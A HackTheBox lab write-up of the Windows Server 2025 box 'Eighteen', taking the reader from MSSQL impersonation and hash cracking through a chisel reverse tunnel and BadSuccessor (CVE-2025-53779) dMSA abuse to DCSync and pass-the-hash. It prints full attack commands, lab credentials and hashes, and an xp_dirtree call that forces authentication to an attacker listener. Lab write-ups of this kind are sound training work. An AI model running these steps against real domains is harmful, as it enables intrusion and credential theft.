---
title: "eighteen"
date: 2026-02-27
draft: false
tags: ["windows", "active-directory", "mssql", "web"]
categories: ["writeups"]
summary: ""
params:
  box:
    os: "Windows Server 2025 Build 26100 (DC01.eighteen.htb)"
    difficulty: ""
ShowToc: true
---

# Eighteen — HackTheBox Writeup

Eighteen is a Windows Server 2025 Domain Controller that chains a creative MSSQL impersonation attack with a web app credential harvest to gain an initial foothold, then exploits **BadSuccessor (CVE-2025-53779)** — a novel Active Directory privilege escalation abusing delegated Managed Service Accounts — to achieve full domain compromise. What makes this box particularly instructive is how many standard Windows privesc paths are deliberately closed off, forcing you to understand cutting-edge AD attack primitives rather than reaching for familiar tools.

---

## Reconnaissance

### Port Scanning

A standard Nmap scan reveals a deceptively small attack surface:

```bash
nmap -sC -sV -p- --min-rate 5000 -oA nmap/full $TARGET
```

The key open ports:

| Port | Service |
|------|---------|
| 80/tcp | IIS 10.0 (Flask/Werkzeug app) |
| 1433/tcp | MSSQL 2022 RTM |
| 5985/tcp | WinRM |
| 53/udp | DNS |

Notably, the standard DC ports — 88 (Kerberos), 135 (RPC), 389 (LDAP), 445 (SMB) — are **filtered externally** by the host firewall. This is a deliberate obstacle we'll need to route around later. The hostname `DC01.eighteen.htb` confirms we're dealing with a Domain Controller directly.

```
18.htb → add to /etc/hosts: $TARGET eighteen.htb dc01.eighteen.htb
```

One important detail from the scan: the DC's clock is approximately **7 hours ahead** of my local time. Kerberos has a default 5-minute skew tolerance, so I'll need to sync my clock before any Kerberos operations.

### Web Application

The app at `http://eighteen.htb/` is a Flask/Werkzeug financial planning application served through IIS. Browsing the routes (`/login`, `/register`, `/dashboard`, `/admin`, `/add_expense`) and testing the registration endpoint reveals that error conditions leak raw SQL errors in Flask session cookies — a useful signal that there's a database backend.

The app uses raw SQL via ODBC Driver 17, but with parameterized queries throughout, so direct injection is off the table. The more interesting finding comes later, once we have MSSQL access.

### Initial Credential — Read the Box Instructions

The box provides a starting credential: `kevin / iNa2we6haRj2gaw!`

I'll be honest — I initially missed this and spent time trying to attack the web app first. The lesson: read the box description before diving in. Once I validated the creds against MSSQL, everything clicked into place.

---

## Foothold

### MSSQL Access and Impersonation

Logging in with `kevin`'s credentials confirms MSSQL access. Kevin authenticates via Windows auth and lands in the `master` database as a guest. The interesting pivot is that kevin has `IMPERSONATE` rights on the `appdev` SQL login:

```bash
nxc mssql $TARGET -u kevin -p 'iNa2we6haRj2gaw!' -q "SELECT name FROM sys.database_principals WHERE type = 'S'"
```

Only two SQL logins exist: `sa` and `appdev`. Kevin can escalate:

```sql
EXECUTE AS LOGIN = 'appdev';
SELECT SYSTEM_USER;
-- Returns: appdev
```

As `appdev`, we gain access to the `financial_planner` database. Before exploring that, let's enumerate domain users. The RID brute technique works nicely through MSSQL:

```bash
nxc mssql $TARGET -u kevin -p 'iNa2we6haRj2gaw!' -M mssql_priv --rid-brute
```

This yields a solid list of domain accounts: `Administrator`, `mssqlsvc`, `jamie.dunn`, `jane.smith`, `alice.jones`, `adam.scott`, `bob.brown`, `carol.white`, `dave.green`, `kevin`.

### Harvesting the Web App Credentials

Now for the interesting part. As `appdev`, querying the `financial_planner` database:

```sql
EXECUTE AS LOGIN = 'appdev';
USE financial_planner;
SELECT * FROM users;
```

This dumps the web app's users table, including an admin account with a Werkzeug PBKDF2 hash. Werkzeug stores these in the format `pbkdf2:sha256:600000$<salt>$<hash>`, which maps to hashcat mode 10900.

```bash
hashcat -m 10900 admin_hash.txt /usr/share/wordlists/rockyou.txt
```

The hash cracks to `iloveyou1`. Before we can use this on the web app, a more valuable question: is this password reused elsewhere on the domain?

### Password Spray to WinRM

```bash
nxc winrm $TARGET -u domain_users.txt -p 'iloveyou1'
```

`adam.scott:iloveyou1` hits — marked `Pwn3d!` by CrackMapExec, meaning adam has WinRM access. A quick check reveals why: adam.scott is in both the `IT` group and `Remote Management Users`.

```bash
evil-winrm -i $TARGET -u adam.scott -p 'iloveyou1'
```

We have a shell.

### Aside: What About the MSSQL Service Account?

While enumerating MSSQL, I tried capturing the service account's NTLMv2 hash via `xp_dirtree` pointing at a Responder listener:

```sql
EXECUTE AS LOGIN = 'appdev';
EXEC master.dbo.xp_dirtree '\\<KALI_IP>\share', 1, 1;
```

Responder caught the hash for `EIGHTEEN\mssqlsvc`, but it didn't crack against rockyou. A dead end, but worth attempting — service account hashes occasionally crack quickly.

---

## Privilege Escalation

### Ruling Out the Obvious

With a foothold as `adam.scott`, standard Windows privilege escalation enumeration (winPEAS, manual checks) turns up nothing easy:

- No LAPS, ADCS, or gMSA deployments
- No GPP passwords in SYSVOL
- Only `krbtgt` is Kerberoastable (useless)
- No constrained delegation on any users or computers
- No modifiable services, no AutoLogon credentials
- The IIS app directory is read-execute only for Users

I also verified the MSSQL angle: `appdev` is not `db_owner` of any database and `TRUSTWORTHY` is off, so no trusted assembly or CLR escalation is possible.

### The Actual Path: BloodHound Tells the Story

Running SharpHound and importing into BloodHound immediately surfaces a promising path:

```
IT (Group) → CanPSRemote → DC01 → HasSession → Administrator → MemberOf → Domain Admins
```

Administrator has an active session on DC01. If we can get SYSTEM on the DC, we can dump credentials. The question is how to get there from `adam.scott` → `IT` group → SYSTEM on DC01.

Further ACL enumeration of the `IT` group reveals the critical finding:

```
IdentityReference  : EIGHTEEN\IT
ActiveDirectoryRights : CreateChild
ObjectType         : 00000000-0000-0000-0000-000000000000  (ALL object types)
OU                 : OU=Staff,DC=eighteen,DC=htb
IsInherited        : False
```

The IT group has `CreateChild` rights on the `Staff` OU — intentionally set, not inherited. This means members of IT can create any AD object type within that OU.

There's one more puzzle piece: checking the domain password policy reveals `DOMAIN_PASSWORD_STORE_CLEARTEXT` is enabled (reversible encryption). This won't matter for our final attack, but it's worth noting for the overall picture.

### BadSuccessor (CVE-2025-53779)

**What is BadSuccessor?**

Windows Server 2025 introduced **delegated Managed Service Accounts (dMSAs)**, a new object type where a service account can be designated as the "successor" to an existing account. When migration completes, the dMSA inherits the predecessor's Kerberos keys — meaning it can authenticate *as* the predecessor account.

The vulnerability: anyone with `CreateChild` on an OU can create a dMSA, and **there is no permission check on who the predecessor is**. Set Administrator as the predecessor, and your dMSA inherits Administrator's Kerberos keys. Game over.

### Step 1: Set Up a SOCKS Tunnel

The DC's Kerberos (88), LDAP (389), and SMB (445) ports are filtered externally. We need to route through our WinRM session. Chisel handles this cleanly:

On Kali:
```bash
chisel server --reverse -p 9001
```

On DC01 via evil-winrm:
```powershell
.\chisel.exe client <KALI_VPN_IP>:9001 R:socks
```

Update `/etc/proxychains4.conf`:
```
socks5 127.0.0.1 1080
```

Now all impacket tools can reach the DC via `proxychains`.

### Step 2: Create a Computer Account

The dMSA authentication flow requires a machine account to perform S4U2Self. With `ms-DS-MachineAccountQuota > 0` (default is 10), any domain user can create one:

I initially tried `Invoke-BadSuccessor.ps1` for this step. It creates a computer account (`Pwn$`) correctly, but its `New-ADServiceAccount -CreateDelegatedServiceAccount` call has **no error handling** — when the dMSA creation fails silently, the script prints placeholder output as if it succeeded, and `$service` is null. I only discovered this by checking:

```powershell
Get-ADObject -LDAPFilter "(objectClass=msDS-DelegatedManagedServiceAccount)"
# Returns nothing — the dMSA was never created
```

Always verify your objects actually exist.

### Step 3: Create the dMSA Manually

Here's the subtle constraint: `CreateChild` grants creation rights, but **not modification rights**. After creating a dMSA, I couldn't modify its attributes because the object's DACL defaults to Domain Admins as owner on Server 2025. No `GenericAll`, no `WriteProperty`.

The solution: set all critical attributes in the **same LDAP Add operation** using `-OtherAttributes`. You get one shot:

```powershell
New-ADServiceAccount -Name "evilDMSA2" `
    -DNSHostName "evilDMSA2.eighteen.htb" `
    -CreateDelegatedServiceAccount `
    -PrincipalsAllowedToRetrieveManagedPassword "Pwn$" `
    -Path "OU=Staff,DC=eighteen,DC=htb" `
    -KerberosEncryptionType AES256 `
    -OtherAttributes @{
        "msDS-DelegatedMSAState" = 2
        "msDS-ManagedAccountPrecededByLink" = "CN=Administrator,CN=Users,DC=eighteen,DC=htb"
    } -PassThru
```

Two key attributes:
- `msDS-DelegatedMSAState = 2` — marks migration as complete, triggers key inheritance
- `msDS-ManagedAccountPrecededByLink` — points to Administrator as the predecessor

Verify the dMSA exists before proceeding:

```powershell
Get-ADObject -LDAPFilter "(objectClass=msDS-DelegatedManagedServiceAccount)" -Properties *
```

### Step 4: Obtain the dMSA's Inherited Keys

This is where impacket does the heavy lifting. First, we need the AES256 key for `Pwn$`. The Kerberos salt for a computer account is `DOMAIN.FQDNhostaccountname.domain.fqdn` (lowercase account name without the trailing `$`):

```bash
python3 -c "
from impacket.krb5.crypto import string_to_key
from impacket.krb5.constants import EncryptionTypes
key = string_to_key(
    EncryptionTypes.aes256_cts_hmac_sha1_96.value,
    b'Password123!',
    b'EIGHTEEN.HTBhostpwn.eighteen.htb'
)
print(key.contents.hex().upper())
"
# Output: 07CE45274C9D70F6C47ACD9D72838A4D292903CBC8947E2C32B7F9E0ECF17D0B
```

Get a TGT for `Pwn$`:

```bash
proxychains -q impacket-getTGT \
    -aesKey 07CE45274C9D70F6C47ACD9D72838A4D292903CBC8947E2C32B7F9E0ECF17D0B \
    -dc-ip $TARGET \
    'eighteen.htb/Pwn$'
```

Now perform S4U2Self with the dMSA flag. This authenticates as `Pwn$`, requests a service ticket for `evilDMSA2$`, and during the process the DC returns `KERB_DMSA_KEY_PACKAGE` — the predecessor's (Administrator's) Kerberos keys baked in:

```bash
KRB5CCNAME=Pwn\$.ccache proxychains -q impacket-getST \
    -k -no-pass \
    -impersonate 'evilDMSA2$' \
    -self \
    -dmsa \
    -dc-ip $TARGET \
    'eighteen.htb/Pwn$'
```

A note on Rubeus: I tried `Rubeus.exe asktgs /dmsa` first. Version 2.3.3 gets a successful TGS response but crashes with a `NullReferenceException` in response parsing before saving any output. Use impacket from Kali through the tunnel instead.

Also critical: fix your clock before running Kerberos operations. Use `-debug` on any impacket tool to see the DC's reported UTC time, then sync locally:

```bash
sudo date -s "2026-02-27 HH:MM:SS"  # adjust to match DC's UTC
```

### Step 5: DCSync

The `impacket-getST` output saves a ccache file named after the dMSA. This ticket has Administrator's privileges. Use it for DCSync:

```bash
KRB5CCNAME='evilDMSA2$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache' \
    proxychains -q impacket-secretsdump \
    -k -no-pass \
    -just-dc-user Administrator \
    'eighteen.htb/evilDMSA2$@dc01.eighteen.htb' \
    -dc-ip $TARGET
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0b133be956bfaddf9cea56701affddec:::
```

### Step 6: Pass the Hash

```bash
evil-winrm -i $TARGET -u Administrator -H 0b133be956bfaddf9cea56701affddec
```

Domain compromised.

---

## Lessons Learned

**Read the box instructions.** The box provided `kevin`'s credentials upfront. Missing that cost significant time on web app enumeration that led nowhere. Starting information is starting information — use it.

**Run BloodHound early.** Manual AD enumeration eventually found the `IT → CreateChild on Staff OU` path, but BloodHound would have surfaced the full `IT → CanPSRemote → DC01 → HasSession → Administrator` chain immediately. On Active Directory boxes, SharpHound should run within the first 10 minutes of getting a shell.

**BadSuccessor (CVE-2025-53779) is a powerful primitive.** Any user with `CreateChild` on any OU in a Windows Server 2025 domain can create a dMSA with any account as predecessor — including Domain Admins. There are no permission checks on predecessor selection. The attack is silent, leaves a persistent AD object, and works with default settings. Check your OUs for misplaced `CreateChild` ACEs.

**Filtered ports ≠ closed ports.** DC01 had all standard DC ports listening locally; the host firewall just blocked external access. A SOCKS tunnel through WinRM/evil-winrm bypasses this entirely. When you have code execution but Kerberos-based tools fail, check whether you need to tunnel.

**`CreateChild` does not imply `WriteProperty`.** Creating an AD object and modifying it are separate rights. When you only have creation rights, bake all necessary attributes into the initial LDAP Add operation using `-OtherAttributes`. Attempting to modify post-creation will fail with access denied.

**Verify objects exist before proceeding.** `Invoke-BadSuccessor.ps1` silently fails on dMSA creation with no exception handling. The script continues printing "success" output with null values. After any AD object creation, confirm with `Get-ADObject` before building on top of it.

**Rubeus 2.3.3 dMSA support is broken.** The `/dmsa` flag in `asktgs` crashes on response parsing. Use `impacket-getST -impersonate <dMSA$> -self -dmsa` from Kali through a SOCKS tunnel instead. This requires computing the computer account's AES key manually and a two-step TGT → ST flow, but it works reliably.

**`evil-winrm` network logon sessions can't use Kerberos tickets from Rubeus `/ptt`.** Pass-the-ticket into an evil-winrm session doesn't work for subsequent Kerberos operations because the session's logon type doesn't support it. For anything requiring live Kerberos against DC ports, use impacket from your attacking machine through a tunnel.